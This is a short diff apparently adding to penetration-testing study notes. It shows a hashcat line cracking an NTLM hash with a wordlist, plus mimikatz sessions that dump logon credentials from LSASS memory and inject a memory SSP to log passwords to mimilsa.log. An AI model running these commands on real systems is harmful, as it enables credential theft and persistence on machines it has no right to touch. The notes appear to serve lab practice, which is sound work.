@@ -941,3 +941,21 @@ User : nelly
 hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt.gz -r /usr/share/hashcat/rules/best64.rule
 ~~~
 
+
+~~~ bash
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+~~~
+
+
+~~~ bash
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # misc::memssp
+Injected =)
+
+PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
+~~~
